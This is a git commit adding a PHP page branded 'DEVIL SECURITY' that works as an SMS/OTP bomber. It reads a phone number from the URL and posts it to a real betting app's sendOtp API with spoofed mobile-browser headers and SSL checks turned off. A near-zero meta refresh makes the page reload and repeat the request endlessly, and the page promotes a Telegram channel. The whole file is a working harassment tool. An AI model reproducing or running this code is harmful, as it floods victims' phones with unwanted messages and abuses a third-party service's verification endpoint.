af0c8685386f07518e15aecd873e629d31adc341
LesterDroid <134652994+LesterDroid@users.noreply.github.com>
2023-05-29 13:37:27 +0530

    Add files via upload

---
+++ otp.php
@@ -0,0 +1,106 @@
+<!DOCTYPE html><html lang="en"><head> <meta charset="UTF-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <link rel="preconnect" href="https://fonts.googleapis.com"> <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> <link href="https://fonts.googleapis.com/css2?family=Bree+Serif&family=Montserrat:wght@400;600&display=swap" rel="stylesheet"> <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"> <link rel="stylesheet" href="style.css"> <title>DEVIL SECURITY </title></head><style>*{ margin: 0; padding: 0; box-sizing: border-box; font-family: 'Bree Serif', serif; } body{ width: 100%; height: 100vh; text-align: center; background-color: rgb(255, 255, 255); /* overflow: hidden; */ } .limiter{ width: 100%; padding: 0 25px; } .limiter h1{ font-size: 20px; font-family: 'Bree Serif', serif; font-weight: 300; text-transform: uppercase; letter-spacing: 1px; margin-top: 50px; margin-bottom: 50px; }
+input{ font-family: 'Bree Serif', serif; width: 100%; height: 45px; font-weight: 200;
+padding: 12px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: block;
+  font-size: 14px;
+  margin: 5px auto;
+border: 2px solid rgb(0, 141, 146);
+  border-radius: 5px 5px 5px 5px;
+  outline: none;margin-top: 0px; margin-bottom: 25px;
+  }
+.input{ border: 1.5px solid rgb(211, 211, 211); background-color: transparent; padding: 0 15px; transition: 0.5s; }
+ .input:focus{ border: 1.5px solid rgb(0, 141, 146); }
+  .submit{ margin: 15px 0; border: none; background-color: rgb(0, 141, 146); color: #fff; text-transform: uppercase; letter-spacing: 2px; box-shadow: 0px 0px 3px rgba(0, 0, 0, 0.349); transition: 0.5s; } .submit:hover{ background-color: rgb(7, 89, 94); } .telegram{ font-family: 'Bree Serif', serif; width: 100%; height: 65px; font-weight: 200; margin: 30px 0; border-radius: 4px; background-color: rgb(0, 141, 146); display: flex; justify-content: center; align-items: center; box-shadow: 0px 0px 3px rgba(0, 0, 0, 0.349); } .telegram i{ color: #fff; font-size: 30px; margin-left: -30px; } .telegram a{ color: #fff; text-decoration: none; font-weight: 300; letter-spacing: 2px; margin-left: 10px; font-size: 16px; text-transform: uppercase; } .success{ font-size: 15px; letter-spacing: 1px; font-family: 'Bree Serif', serif; width: 100%; padding: 18px 0; font-weight: 200; margin: 10px 0; border-radius: 4px; background-color: #d1e6dd; color: #105133; border: 1px solid #9fcfba; } .error{ font-size: 15px; letter-spacing: 1px; font-family: 'Bree Serif', serif; width: 100%; padding: 18px 0; font-weight: 200; margin: 10px 0; border-radius: 4px; background-color: #f7d7da; color: #84200a; border: 1px solid #f5c2c7; } .white{ font-size: 15px; letter-spacing: 1px; font-family: 'Bree Serif', serif; width: 100%; padding: 18px 0; font-weight: 200; margin: 10px 0; border-radius: 4px; background-color: #e2e3e5; color: #41464a; border: 1px solid #d5dbdb; } .blue{ font-size: 15px; letter-spacing: 1px; font-family: 'Bree Serif', serif; width: 100%; padding: 18px 0; font-weight: 200; margin: 10px 0; border-radius: 4px; background-color: #cfe2ff; color: #084195; border: 1px solid #d7d4fe; }
+
+ select { width: 100%; height: 65px; margin: 15px 0; border-radius: 4px;		padding:0 20px;		font-size: 15px;		outline: none; font-family: 'Bree Serif', serif; }</style><body> <div class="limiter"> <h1>DEVIL SECURITY </h1><h1> GAND FAD BOMBER  </h1>
+
+	
+<?php
+Error_reporting(0);
+function Randomer($length){
+$str="";
+for($i=0;$i<$length;$i++){
+$str.=mt_rand(0,9);
+}
+return $str;
+}
+
+$m=array("ram","shyam","lalit","som","sonu","king","nemar","nandu","lokesh","rahul","tom","tony","michal","jones","starc","smith","smriti","suman","pooja","jyoti","munro","guptil","taylor","tanu","tejas","tanmay","surbi" ,"gaurav","goru","ganesh","decock","amla","anju","hero","killer","russel","simmons","sindhu","hacker", "sambhu","sabita","chinu","donald","kapil","viru","baldau","ramu","rawdi","ravan","ram2","shyam2","lalit2","somw","sronu","kinhg","nemhar","nanbdu","lokhesh","rahhul","tohm","tonhy","michhal","jonjes","starhch","smijth","smrhiti","sumhan","poongja","jyhoti","munbro","gupktibl","taylbdjdjor","tajdudnhu","tejajdjdhs","tanmhajdjdy","surgeiurjdbi" ,"gaurhdjdjjdfjav","gojrdjdjjrjru","ganehudjdsh","dechoudjdck","amudjdjdlga","anididju","hedujdro","killedhdur","russeduudl","simmojdjdns","sijdjdndhu","hacdjdjker", "samjdjdbhu","sabidjjdta","chijdjdnu","donjdjdald","kapdjdjil","virdjjdu","baldadjjdu","rajdjdmu","rawddjjdi","ravdjjdan");
+$fname=$m[mt_rand(0,50)];
+
+$n=array("patjdjdel","shardjdjma","sinhdudgh","thakfjjdur","gupududta","kumari","kundu","kumari","soni","trumph","steve","som","mondal","mick","manav","maryin","jones","hamza","rathour","mondak","kohli","dhawan","silva","dhoni","patil","poker","pronjal","piku","pondu","randi","rawdi","jalbbi","julmi","joker","khan","chaubey","ali","vishnoi","voni","ballad","billu","kalia","kuber","roberg","robert","ren","rewsi","modu",);
+$lname=$n[mt_rand(0,50)];
+
+function rando($length){
+$str="";
+$char='ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+$charArray= str_split($char);
+for($i=0;$i<$length;$i++){
+$randitem= array_rand($charArray);
+$str.="".$charArray[$randitem];
+}
+return $str;
+}
+$im=rando(4);
+$ik=rando(16);
+$sa=rando(8).'-'.rando(4).'-'.rando(4).'-'.rando(4).'-'.rando(12);
+
+function RandomNumber($length){
+$str="";
+for($i=0;$i<$length;$i++){
+$str.=mt_rand(0,9);
+}
+return $str;
+}
+$cook=rando(strlen("2a0c836489c081ab23a62d9cc99e4c31"));
+$ip=rando(strlen("47.15.245.157"));
+$n=RandomNumber(2).'.'.RandomNumber(6);
+$m=RandomNumber(2).'.'.RandomNumber(7);
+$p=RandomNumber(15);
+$o=RandomNumber(2);
+$i=RandomNumber(5);
+
+$mo=$_GET['mo'];
+$refer=$_GET['refer'];
+
+$url5='https://api.jeet11.com/account-service/external/v1.0.0/sendOtp';
+
+$data5='{"phoneNo":"'.$mo.'","countryAreaCode":"91","language":"English"}';
+
+$headers5[]='Content-Length: '.strlen($data5).'';
+$headers5[]='Host:api.jeet11.com';
+$headers5[]='user-agent:Mozilla/5.0 (Linux; Android 11; M2003J15SC Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36';
+$headers5[]='content-type:application/json';
+$headers5[]='accept: application/json, text/plain, */*';
+$headers5[]='x-header-deviceid: 07ec8d64-7d0b-49b6-a296-a342dbcfc576';
+$headers5[]='x-requested-with: mark.via.gp';
+$headers5[]='content-length: ';
+$headers5[]='origin: https://www.jeet11.com';
+$headers5[]='referer: https://www.jeet11.com/';
+$headers5[]='accept-encoding: gzip, deflate';
+$headers5[]='x-client-app-type: JEET11';
+$headers5[]='sec-fetch-site: same-site';
+$headers5[]='sec-fetch-mode: cors';
+$headers5[]='sec-fetch-dest: empty';
+$headers5[]='accept-language: en-IN,en-US;q=0.9,en;q=0.8';
+
+$ch77 = curl_init();
+curl_setopt($ch77, CURLOPT_URL,$url5);
+curl_setopt($ch77, CURLOPT_POST, 1);
+curl_setopt($ch77, CURLOPT_POSTFIELDS,$data5);
+ curl_setopt($ch77, CURLOPT_RETURNTRANSFER, 1);
+   curl_setopt($ch77, CURLOPT_HTTPHEADER,$headers5);
+   curl_setopt($ch77, CURLOPT_ENCODING, 'deflate,gzip');  
+ curl_setopt($ch77, CURLOPT_SSL_VERIFYPEER, false);
+ $output66= curl_exec ($ch77);
+ $json=json_decode($output66,true);
+$msg=$json["msg"];
+echo "<div class='success'> Sms Bomber Started On : $mo</div>";
+echo "<meta http-equiv='refresh' content=0.0001>";
+echo "<meta http-equiv='refresh' content=5;url='https://telegram.dog/DeviL_FiLes0_0'>";
+ 
+?>
+
+<div class="telegram"> <i class="fa fa-telegram" aria-hidden="true"></i> <a href="https://telegram.dog/DeviL_FiLes0_0">Join Our Telegram</a></div></div></body></html>
